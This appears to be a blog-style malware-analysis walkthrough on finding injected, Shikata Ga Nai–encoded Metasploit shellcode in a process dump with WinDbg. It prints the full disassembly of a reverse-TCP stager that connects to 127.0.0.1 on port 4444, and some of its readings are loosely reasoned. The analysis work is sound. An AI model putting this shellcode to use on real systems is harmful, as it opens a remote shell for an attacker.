# Detecting Shellcode with WinDbg

In malware analysis, one of the common techniques attackers use is injecting shellcode into legitimate processes to evade detection. Particularly, when using Metasploit Shikata Ga Nai, the shellcode can be encoded to bypass security mechanisms such as antivirus software or EDR.

To save time, I got lazy and didn’t generate the Metasploit payload myself. Instead, I relied on my teammate – PhongNh 🤡 – who has expertise in encoding shellcode. With his help, we created `encoded_payload.exe`, a file containing shellcode that has been obfuscated using Shikata Ga Nai.

## Overview

This article will guide you through the process of detecting injected shellcode in a process using WinDbg, a powerful debugging and reverse engineering tool from Microsoft. We will analyze the `encoded_payload.exe` file, locate the injected shellcode in memory, and decode it to investigate the potential threat.

The main objective is to inject shellcode into the `encoded_payload.exe` process and then use Process Hacker or ProcDump to dump the entire memory of the suspected process into a `.dmp` file. This allows us to analyze and detect the injected shellcode.

Let's start using the familiar WinDbg interface to analyze `encoded_payload.dmp`.

## Step 1: Using !peb in WinDbg

The first step in analyzing `encoded_payload.dmp` is to inspect the Process Environment Block (PEB) using the `!peb` command in WinDbg.

### 📌 What is `!peb`?

`!peb` (Process Environment Block) provides crucial information about the process, including:

✔️ **ImageBaseAddress** – The base address where the executable is loaded in memory.
✔️ **Command Line** – The command-line arguments used to start the process.
✔️ **Loaded Modules** – A list of DLLs loaded by the process, which can help detect suspicious injections.
✔️ **Heap and Environment Variables** – Useful for detecting anomalies in memory usage or environment modifications.

### 🛠 Why is `!peb` important?

By analyzing the PEB, we can:

✅ Check if the process was started normally or through suspicious means.
✅ Identify any unusual or injected modules that could indicate shellcode execution.
✅ Extract useful metadata to guide further memory analysis.

## WinDbg Output for `!peb`

```
0:000> !peb
PEB at 0033a000
    InheritedAddressSpace:    No
    ReadImageFileExecOptions: No
    BeingDebugged:            No
    ImageBaseAddress:         00400000
    NtGlobalFlag:             0
    NtGlobalFlag2:            0
    Ldr                       77885d80
    Ldr.Initialized:          Yes
    Ldr.InInitializationOrderModuleList: 00882998 . 008e1850
    Ldr.InLoadOrderModuleList:           00882a70 . 008e1840
    Ldr.InMemoryOrderModuleList:         00882a78 . 008e1848
            Base TimeStamp                     Module
          400000 4a5eadbe Jul 16 11:34:06 2009 C:\Users\longth\Downloads\encoded_payload.exe
        77760000 C:\Windows\SYSTEM32\ntdll.dll
        774f0000 60aa50b0 May 23 19:55:12 2021 C:\Windows\System32\KERNEL32.DLL
        76730000 11253621 Feb 12 14:09:21 1979 C:\Windows\System32\KERNELBASE.dll
        749c0000 C:\Windows\SYSTEM32\apphelp.dll
        762d0000 7f567a50 Sep 12 20:10:40 2037 C:\Windows\System32\MSVCRT.dll
        76050000 C:\Windows\System32\ADVAPI32.dll
        76390000 C:\Windows\System32\sechost.dll
        75f30000 C:\Windows\System32\RPCRT4.dll
        77090000 C:\Windows\System32\WS2_32.dll
        74270000 4e127638 Jul 05 09:26:00 2011 C:\Windows\SYSTEM32\WSOCK32.dll
        77040000 C:\Windows\System32\SHLWAPI.dll
        74210000 C:\Windows\system32\mswsock.dll
    SubSystemData:     00000000
    ProcessHeap:       00880000
    ProcessParameters: 008816d0
    CurrentDirectory:  'C:\Users\longth\Downloads\'
    WindowTitle:  'C:\Users\longth\Downloads\encoded_payload.exe'
    ImageFile:    'C:\Users\longth\Downloads\encoded_payload.exe'
    CommandLine:  '"C:\Users\longth\Downloads\encoded_payload.exe" '
    DllPath:      '< Name not readable >'
    Environment:  00880af0
        ALLUSERSPROFILE=C:\ProgramData
        APPDATA=C:\Users\longth\AppData\Roaming
        CommonProgramFiles=C:\Program Files (x86)\Common Files
        CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
        CommonProgramW6432=C:\Program Files\Common Files
        COMPUTERNAME=vmware-mittre
        ComSpec=C:\Windows\system32\cmd.exe
        DriverData=C:\Windows\System32\Drivers\DriverData
        HOMEDRIVE=C:
        HOMEPATH=\Users\longth
        LOCALAPPDATA=C:\Users\longth\AppData\Local
        LOGONSERVER=\\vmware-mittre
        NUMBER_OF_PROCESSORS=4
        OneDrive=C:\Users\longth\OneDrive
        OS=Windows_NT
        Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\longth\AppData\Local\Microsoft\WindowsApps
        PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
        PROCESSOR_ARCHITECTURE=x86
        PROCESSOR_ARCHITEW6432=AMD64
        PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMD
        PROCESSOR_LEVEL=25
        PROCESSOR_REVISION=5000
        ProgramData=C:\ProgramData
        ProgramFiles=C:\Program Files (x86)
        ProgramFiles(x86)=C:\Program Files (x86)
        ProgramW6432=C:\Program Files
        PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
        PUBLIC=C:\Users\Public
        SystemDrive=C:
        SystemRoot=C:\Windows
        TEMP=C:\Users\longth\AppData\Local\Temp
        TMP=C:\Users\longth\AppData\Local\Temp
        USERDOMAIN=vmware-mittre
        USERDOMAIN_ROAMINGPROFILE=vmware-mittre
        USERNAME=longth
        USERPROFILE=C:\Users\longth
        windir=C:\Windows
```
### 📌 Key Information from !peb Output

#### 🔹 Process Execution Details
- **BeingDebugged:** No → The process is not currently being debugged, meaning no debugger was attached when it was running.
- **ImageBaseAddress:** 00400000 → This is the base memory address where `encoded_payload.exe` is loaded.

#### 🔹 Loaded Modules
The process has several DLLs loaded, including:
- `ntdll.dll` (Windows NT Layer)
- `KERNEL32.DLL` and `KERNELBASE.dll` (Essential system libraries)
- `MSVCRT.dll` (Microsoft C Runtime)
- `WS2_32.dll` and `mswsock.dll` (Winsock libraries, indicating potential network activity)

⚠️ **Suspicious Sign** → The presence of `apphelp.dll` can sometimes indicate Application Compatibility Shimming, a technique used for process injection.

#### 🔹 Executable and Command-Line Arguments
- **ImageFile:** `C:\Users\longth\Downloads\encoded_payload.exe`  
  → Confirms the process is running from this path.
- **CommandLine:** `"C:\Users\longth\Downloads\encoded_payload.exe"`  
  → No extra arguments are passed, meaning it likely runs with its default execution flow.

#### 🔹 Environment Variables
Provides system-level details such as:
- **SystemRoot:** `C:\Windows` → Default Windows directory.
- **Username:** `longth` → The logged-in user running the process.
- **Path:**
  ```
  C:\Windows\system32;
  C:\Windows;
  C:\Windows\System32\Wbem;
  C:\Windows\System32\WindowsPowerShell\v1.0\;
  C:\Windows\System32\OpenSSH\;
  C:\Users\longth\AppData\Local\Microsoft\WindowsApps
  ```
  → This shows the directories where the system looks for executable files. The presence of `WindowsPowerShell`, `OpenSSH`, and `System32` suggests that the process might have access to various system tools, which could be leveraged for further execution or privilege escalation.
- **TEMP:** `C:\Users\longth\AppData\Local\Temp` → The process might drop temporary files here.
### 📌 Next Step: Use `lm` (List Modules) to verify any unknown or injected DLLs! 🚀

```
lmv m *
Browse full module list
start    end        module name
00400000 00416000   encoded_payload C (no symbols)           
    Loaded symbol image file: encoded_payload.exe
    Image path: C:\Users\longth\Downloads\encoded_payload.exe
    Image name: encoded_payload.exe
    Browse all global symbols  functions  data  Symbol Reload
    Timestamp:        Thu Jul 16 11:34:06 2009 (4A5EADBE)
    CheckSum:         00000000
    ImageSize:        00016000
    File version:     2.2.14.0
    Product version:  2.2.14.0
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        1.0 App
    File date:        00000000.00000000
    Translations:     0409.04b0
    Information from resource tables:
        CompanyName:      Apache Software Foundation
        ProductName:      Apache HTTP Server
        InternalName:     ab.exe
        OriginalFilename: ab.exe
        ProductVersion:   2.2.14
        FileVersion:      2.2.14
        FileDescription:  ApacheBench command line utility
        LegalCopyright:   Copyright 2009 The Apache Software Foundation.
        Comments:         Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0
```

### 📌 Module Analysis from `lmv m *`

#### 🔹 Encoded Payload Module Details

| Attribute            | Value |
|----------------------|------------------------------------------------|
| **Start Address**    | `00400000` |
| **End Address**      | `00416000` |
| **Module Name**      | `encoded_payload` |
| **Image Path**       | `C:\Users\longth\Downloads\encoded_payload.exe` |
| **Image Name**       | `encoded_payload.exe` |
| **Timestamp**        | `Thu Jul 16 11:34:06 2009 (4A5EADBE)` |
| **CheckSum**         | `00000000` |
| **Image Size**       | `00016000` |
| **File Version**     | `2.2.14.0` |
| **Product Version**  | `2.2.14.0` |
| **File Flags**       | `0 (Mask 3F)` |
| **File OS**          | `4 Unknown Win32` |
| **File Type**        | `1.0 App` |
| **File Date**        | `00000000.00000000` |
| **Translations**     | `0409.04b0` |

#### 🔹 Resource Table Information
- **Company Name:** Apache Software Foundation
- **Product Name:** Apache HTTP Server
- **Internal Name:** ab.exe
- **Original Filename:** ab.exe
- **Product Version:** 2.2.14
- **File Version:** 2.2.14
- **File Description:** ApacheBench command line utility
- **Legal Copyright:** Copyright 2009 The Apache Software Foundation.
- **Comments:** Licensed under the Apache License, Version 2.0.

📌 **Suspicious Observation:**
- The process name `encoded_payload.exe` does not align with the metadata extracted from its resources.
- The **original filename** is `ab.exe`, which belongs to ApacheBench, a command-line utility for benchmarking web servers.
- If this executable was expected to be something else but contains metadata from ApacheBench, it may have been tampered with or repurposed for malicious activity.
- The **timestamp (2009)** is quite old, which may indicate an outdated or repurposed file.
- Further static and dynamic analysis is required to verify if this file has been modified, packed, or contains shellcode.
- The rest of the information is fine now, all system files are loaded.

### Shellcode Detection Using WinDbg

Shellcode is often injected into separate memory regions (`MEM_PRIVATE`) or regions without a valid module. Using the `!address` command in WinDbg can help identify suspicious memory allocations that may indicate the presence of injected shellcode.

```assembly
0:000> !address

  BaseAddr EndAddr+1 RgnSize     Type       State                 Protect             Usage
-----------------------------------------------------------------------------------------------
+        0    10000    10000             MEM_FREE    PAGE_NOACCESS                      Free       
+    10000    11000     1000 MEM_MAPPED  MEM_COMMIT  PAGE_READONLY                      <unknown>  [F.......dA......]
+    11000    20000     f000             MEM_FREE    PAGE_NOACCESS                      Free       
+    20000    21000     1000 MEM_MAPPED  MEM_COMMIT  PAGE_READONLY                      <unknown>  [F.......dA......]
+    21000    30000     f000             MEM_FREE    PAGE_NOACCESS                      Free       
+    30000    40000    10000 MEM_MAPPED  MEM_COMMIT  PAGE_READWRITE                     <unknown>  [........C.T.....]
+    40000    5d000    1d000 MEM_MAPPED  MEM_COMMIT  PAGE_READONLY                      Other      [API Set Map]
+    5d000    60000     3000             MEM_FREE    PAGE_NOACCESS                      Free       
+    60000    95000    35000 MEM_PRIVATE MEM_RESERVE                                    <unknown>  
     95000    98000     3000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE | PAGE_GUARD        <unknown>  
     98000    a0000     8000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     <unknown>  [................]
+    a0000   19c000    fc000 MEM_PRIVATE MEM_RESERVE                                    Stack      [~0; 2468.2470]
    19c000   19e000     2000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE | PAGE_GUARD        Stack      [~0; 2468.2470]
    19e000   1a0000     2000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Stack      [~0; 2468.2470]
+   1a0000   1a4000     4000 MEM_MAPPED  MEM_COMMIT  PAGE_READONLY                      Other      [System Default Activation Context Data]
+   1a4000   1b0000     c000             MEM_FREE    PAGE_NOACCESS                      Free       
+   1b0000   1b2000     2000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     <unknown>  [................]
+   1b2000   1c0000     e000             MEM_FREE    PAGE_NOACCESS                      Free       
+   1c0000   1c1000     1000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [...t..X.dn..1..Y]
+   1c1000   1e0000    1f000             MEM_FREE    PAGE_NOACCESS                      Free       
+   1e0000   1e1000     1000 MEM_MAPPED  MEM_COMMIT  PAGE_READONLY                      <unknown>  [x....8O.....u...]
+   1e1000   1f0000     f000             MEM_FREE    PAGE_NOACCESS                      Free       
+   1f0000   1f1000     1000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Heap       [ID: 0; Handle: 00880000; Type: Front End]
    1f1000   1fe000     d000 MEM_PRIVATE MEM_RESERVE                                    Heap       [ID: 0; Handle: 00880000; Type: Front End]
+   1fe000   200000     2000             MEM_FREE    PAGE_NOACCESS                      Free
```
🚩 Suspicious RWX Memory Region Found
 ```
+   1c0000   1c1000     1000 MEM_PRIVATE MEM_COMMIT  PAGE_EXECUTE_READWRITE             <unknown>  [...t..X.dn..1..Y]
```
Read assembly from memory
Read assembly from memory using u + <memory address>
```assembly
0:000> u 0x1C0000
001c0000 dbc5            fcmovnb st,st(5)
001c0002 d97424f4        fnstenv [esp-0Ch]
001c0006 58              pop     eax
001c0007 bb646e1988      mov     ebx,88196E64h
001c000c 31c9            xor     ecx,ecx
001c000e b159            mov     cl,59h
001c0010 83e8fc          sub     eax,0FFFFFFFCh
001c0013 315815          xor     dword ptr [eax+15h],ebx
```

- This code looks like shellcode because it includes `fnstenv` combined with `pop eax`. This is a technique to avoid hardcoded addresses.
- `mov ebx, 88196E64h` could be related to an encoded value or an important address.
- `xor dword ptr [eax+15h], ebx` might be a decryption step or obfuscation.

### Extracting Memory to a Binary File
To extract memory to a `.bin` file, use the `.writemem` command:

```shell
.writemem C:\Users\long\Documents\temp\shell-code\phongnh.bin 0x1C0000 0x1C0100
```

This command saves the memory range from `0x1C0000` to `0x1C0100` into the file `phongnh.bin`.
### try to upload the .bin file to virustotal 🤡
![image](https://github.com/user-attachments/assets/278e4570-ce18-4122-a2fb-7d741b4b489f)

A bit of instant noodles 🤡🤡🤡 , but I personally want to clarify the cause

We can dump all the executable memory so as not to miss anything.

```assembly
0:000> u 40c000
encoded_payload+0xc000:
0040c000 60              pushad
0040c001 f4              hlt
0040c002 06              push    es
0040c003 7680            jbe     encoded_payload+0xbf85 (0040bf85)
0040c005 e806760000      call    encoded_payload+0x13610 (00413610)
0040c00a 0000            add     byte ptr [eax],al
0040c00c 40              inc     eax
0040c00d 41              inc     ecx
```

- **`pushad` (`60`)** – Save all registers to the stack.
- **`hlt` (`F4`)** – Stop the CPU until an interrupt is received (often used in anti-debug techniques).
- **`push es` (`06`)** – Push the segment register `ES` onto the stack.
- **`jbe encoded_payload+0xbf85` (`7680`)** – Jump if less than or equal to, may involve conditional checking.
- **`call encoded_payload+0x13610` (`E806760000`)** – Call a function at address `00413610`, which may contain the actual payload.
- **`inc eax`, `inc ecx` instructions** – May be used as a decoy or simply as part of the payload.



```assembly
@miningproject318 ➜ /workspaces/codespaces-jupyter (main) $ objdump -D -b binary -m i386 phongnh.bin

phongnh.bin:     file format binary


Disassembly of section .data:

00000000 <.data>:
   0:   db c5                   fcmovnb %st(5),%st
   2:   d9 74 24 f4             fnstenv -0xc(%esp)
   6:   58                      pop    %eax
   7:   bb 64 6e 19 88          mov    $0x88196e64,%ebx
   c:   31 c9                   xor    %ecx,%ecx
   e:   b1 59                   mov    $0x59,%cl
  10:   83 e8 fc                sub    $0xfffffffc,%eax
  13:   31 58 15                xor    %ebx,0x15(%eax)
  16:   03 58 15                add    0x15(%eax),%ebx
  19:   e2 f5                   loop   0x10
  1b:   fc                      cld    
  1c:   e8 8f 00 00 00          call   0xb0
  21:   60                      pusha  
  22:   31 d2                   xor    %edx,%edx
  24:   89 e5                   mov    %esp,%ebp
  26:   64 8b 52 30             mov    %fs:0x30(%edx),%edx
  2a:   8b 52 0c                mov    0xc(%edx),%edx
  2d:   8b 52 14                mov    0x14(%edx),%edx
  30:   31 ff                   xor    %edi,%edi
  32:   8b 72 28                mov    0x28(%edx),%esi
  35:   0f b7 4a 26             movzwl 0x26(%edx),%ecx
  39:   31 c0                   xor    %eax,%eax
  3b:   ac                      lods   %ds:(%esi),%al
  3c:   3c 61                   cmp    $0x61,%al
  3e:   7c 02                   jl     0x42
  40:   2c 20                   sub    $0x20,%al
  42:   c1 cf 0d                ror    $0xd,%edi
  45:   01 c7                   add    %eax,%edi
  47:   49                      dec    %ecx
  48:   75 ef                   jne    0x39
  4a:   52                      push   %edx
  4b:   8b 52 10                mov    0x10(%edx),%edx
  4e:   8b 42 3c                mov    0x3c(%edx),%eax
  51:   01 d0                   add    %edx,%eax
  53:   8b 40 78                mov    0x78(%eax),%eax
  56:   85 c0                   test   %eax,%eax
  58:   57                      push   %edi
  59:   74 4c                   je     0xa7
  5b:   01 d0                   add    %edx,%eax
  5d:   50                      push   %eax
  5e:   8b 58 20                mov    0x20(%eax),%ebx
  61:   8b 48 18                mov    0x18(%eax),%ecx
  64:   01 d3                   add    %edx,%ebx
  66:   85 c9                   test   %ecx,%ecx
  68:   74 3c                   je     0xa6
  6a:   49                      dec    %ecx
  6b:   8b 34 8b                mov    (%ebx,%ecx,4),%esi
  6e:   01 d6                   add    %edx,%esi
  70:   31 ff                   xor    %edi,%edi
  72:   31 c0                   xor    %eax,%eax
  74:   c1 cf 0d                ror    $0xd,%edi
  77:   ac                      lods   %ds:(%esi),%al
  78:   01 c7                   add    %eax,%edi
  7a:   38 e0                   cmp    %ah,%al
  7c:   75 f4                   jne    0x72
  7e:   03 7d f8                add    -0x8(%ebp),%edi
  81:   3b 7d 24                cmp    0x24(%ebp),%edi
  84:   75 e0                   jne    0x66
  86:   58                      pop    %eax
  87:   8b 58 24                mov    0x24(%eax),%ebx
  8a:   01 d3                   add    %edx,%ebx
  8c:   66 8b 0c 4b             mov    (%ebx,%ecx,2),%cx
  90:   8b 58 1c                mov    0x1c(%eax),%ebx
  93:   01 d3                   add    %edx,%ebx
  95:   8b 04 8b                mov    (%ebx,%ecx,4),%eax
  98:   01 d0                   add    %edx,%eax
  9a:   89 44 24 24             mov    %eax,0x24(%esp)
  9e:   5b                      pop    %ebx
  9f:   5b                      pop    %ebx
  a0:   61                      popa   
  a1:   59                      pop    %ecx
  a2:   5a                      pop    %edx
  a3:   51                      push   %ecx
  a4:   ff e0                   jmp    *%eax
  a6:   58                      pop    %eax
  a7:   5f                      pop    %edi
  a8:   5a                      pop    %edx
  a9:   8b 12                   mov    (%edx),%edx
  ab:   e9 80 ff ff ff          jmp    0x30
  b0:   5d                      pop    %ebp
  b1:   68 33 32 00 00          push   $0x3233
  b6:   68 77 73 32 5f          push   $0x5f327377
  bb:   54                      push   %esp
  bc:   68 4c 77 26 07          push   $0x726774c
  c1:   89 e8                   mov    %ebp,%eax
  c3:   ff d0                   call   *%eax
  c5:   b8 90 01 00 00          mov    $0x190,%eax
  ca:   29 c4                   sub    %eax,%esp
  cc:   54                      push   %esp
  cd:   50                      push   %eax
  ce:   68 29 80 6b 00          push   $0x6b8029
  d3:   ff d5                   call   *%ebp
  d5:   6a 0a                   push   $0xa
  d7:   68 7f 00 00 01          push   $0x100007f
  dc:   68 02 00 11 5c          push   $0x5c110002
  e1:   89 e6                   mov    %esp,%esi
  e3:   50                      push   %eax
  e4:   50                      push   %eax
  e5:   50                      push   %eax
  e6:   50                      push   %eax
  e7:   40                      inc    %eax
  e8:   50                      push   %eax
  e9:   40                      inc    %eax
  ea:   50                      push   %eax
  eb:   68 ea 0f df e0          push   $0xe0df0fea
  f0:   ff d5                   call   *%ebp
  f2:   97                      xchg   %eax,%edi
  f3:   6a 10                   push   $0x10
  f5:   56                      push   %esi
  f6:   57                      push   %edi
  f7:   68 99 a5 74 61          push   $0x6174a599
  fc:   ff d5                   call   *%ebp
  fe:   85 c0                   test   %eax,%eax
 100:   74                      .byte 0x74
```
The binary file phongnh.bin has been disassembled using the objdump command with the following options:

objdump -D -b binary -m i386 phongnh.bin

These options provide the following functionalities:

-D: Displays the entire machine code in assembly.

-b binary: Specifies the file format as binary.

-m i386: Specifies the processor architecture as Intel x86 (i386).

```assembly
d5:   6a 0a                   push   $0xa
d7:   68 7f 00 00 01          push   $0x100007f  ; 127.0.0.1
dc:   68 02 00 11 5c          push   $0x5c110002 ; Port 4444
```
n x86-32 architecture, the push instruction pushes a 4-byte value onto the stack.

Each time a push is executed, the stack pointer (ESP) decreases by 4 bytes.

Analyzing Each Instruction
--------------------------
```assembly
d5: 6a 0a               ; push $0xa (1 byte 6a, followed by 1 byte 0a)
d7: 68 7f 00 00 01      ; push $0x100007f (1 byte 68, followed by 4 bytes 7f 00 00 01)
dc: 68 02 00 11 5c      ; push $0x5c110002 (1 byte 68, followed by 4 bytes 02 00 11 5c)
```
----------------------------------------------------------------------

In x86 (Little Endian), multi-byte data is stored in reverse order.

When interpreted as a struct sockaddr, this corresponds to:

*   0x0002 → AF\_INET (IPv4 socket)
    
*   0x115c → Port 4444 (decimal)
    

Conclusion
----------

The instruction push 0x5c110002 actually pushes a struct sockaddr onto the stack, where:

*   0x0002 represents AF\_INET (IPv4 socket).
    
*   0x115c represents port 4444, but due to Little Endian format, it is stored as 5c 11.

After converting from the rearrangement combination to the location found, address C2 is found, Done !!!!
